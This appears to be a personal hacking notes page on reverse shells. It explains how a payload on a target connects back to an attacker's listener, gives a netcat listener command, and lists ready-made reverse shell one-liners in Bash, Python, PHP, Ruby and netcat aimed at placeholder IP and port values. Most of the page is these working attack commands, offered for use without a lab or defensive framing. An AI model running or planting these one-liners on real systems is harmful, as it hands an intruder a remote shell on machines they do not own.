# Reverse Shell

A very useful techniques used in [[Hacking]] !  

## Why Reversed  

Good Question Charlie! Imma answer !  
Basically there are two types of Intrusions Shells:
    - We can make them waiting for an input and then connect to them (he binds)  
    - We can make them go to a certain input and connect to it (Reversed)  

So the main idea is to set a listener on a specific IP that is hard written in the Reversed Shell.  
Our listener is useless for now, but wait a few seconds !  
Once our Program is in the target, we trigger him to start and launch a shell to a specific IP address (the address we hard wrote earlier).  
This way our listener is now the shell !  
This way we don't have to brutally interact with the target and it does it itself.  
Those types of shell can be wrote in barely every languages but we find them most of the time in Python/Php/Bash/NetCat  
There is also different communication protocol that can be used, most of the time we prefer tcp.  

----------------------------------

## How do I recieve the data  

As I said earlier you just have to set a listener, with netcat for example.  
If you tell the Reverse shell to trigger the port 4444 then you'll have this listener:  

```Bash
nc -lvvnp 4444
```

And whenever the reverse Shell is launch, it'll be your distant shell.  

----------------------------------

## Create your Reverse Shell  

Imma list some commands, those are not the only one and you can find a lot more online !  
And of course you can user better formatted with error gesture reverse shells, those are the building blocks !  

### Bash

```Bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
# OR
exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
```

### Python

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```php
php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
# Or
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
# Or
php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>","<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
# or
ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### NetCat

```sh
nc <IP> <PORT> -e /bin/bash
```
